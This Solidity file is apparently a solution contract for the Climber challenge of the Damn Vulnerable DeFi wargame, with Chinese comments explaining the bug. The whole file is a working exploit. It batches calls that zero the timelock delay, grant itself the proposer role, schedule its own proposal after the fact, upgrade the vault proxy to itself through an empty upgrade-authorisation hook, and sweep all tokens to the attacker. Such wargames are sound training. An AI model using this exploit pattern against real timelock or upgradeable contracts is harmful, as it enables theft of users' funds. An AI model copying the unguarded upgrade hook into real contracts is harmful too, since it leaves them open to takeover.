// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

import "./ClimberTimelock.sol";
import "../DamnValuableToken.sol";

// import "hardhat/console.sol";

contract Attack6 is UUPSUpgradeable {

    // 踩坑点：
    /// @notice 这里要用immutable，否则将会出现slot冲突，因为proxy delegatecall实际使用的自身的slot
    ClimberTimelock immutable timelock;
    address immutable vaultProxy;
    DamnValuableToken immutable token;
    address immutable attacker;

    constructor(ClimberTimelock _timelock, address _vaultProxy, DamnValuableToken _token) {
        timelock = _timelock;
        vaultProxy = _vaultProxy;
        token = _token;
        attacker = msg.sender;
    }

    function buildProposal() internal view returns(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory data
    ){
        targets= new address[](5);
        values =new uint256[](5);
        data=new bytes[](5);

        // 在一个提案中，执行完所有hack过程，顺序需注意
        targets = new address[](5);
        values = new uint256[](5);
        data = new bytes[](5);

        // 1. change delay time
        targets[0] = address(timelock);
        values[0] = 0;
        data[0] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            0
        );
        // 2. grant this contract
        targets[1] = address(timelock);
        values[1] = 0;
        data[1] = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );
        // 3. schedule this proposal by call the function below
        targets[2] = address(this);
        values[2] = 0;
        data[2] = abi.encodeWithSelector(
            Attack6.scheduleProposal.selector
        );
        // 4. upgrade proxy to this contract
        targets[3] = address(vaultProxy);
        values[3] = 0;
        data[3] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(this)
        );
        // 5. sweep all funds to attacker
        targets[4] = address(vaultProxy);
        values[4] = 0;
        data[4] = abi.encodeWithSelector(
            Attack6.sweepFunds.selector
        );
    }

    function scheduleProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory data
        ) = buildProposal();
        
        // console.log("",targets, values, data);
        timelock.schedule(targets, values, data, 0);
    }

    // bug点： execute中的functionCallWithValue()

    // 1. timelock合约本身是admin role, 可以执行grantRole()方法授权给attack合约

    // 2. timelock合约的execute方法任何人都可以调用
    //    检查schedule是否存在是执行完检查，只需要在执行时构建一个执行前不存在的提案即可完成突破

    // 3. updateDelay()方法可以由timelock合约自身修改，故可以通过提案方法实现

    // 4. js中vault的地址实际上是proxy的地址，故资金存在proxy中
    function executeProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory data
        ) = buildProposal();
        
        timelock.execute(targets, values, data, 0);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}

    function sweepFunds() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }

}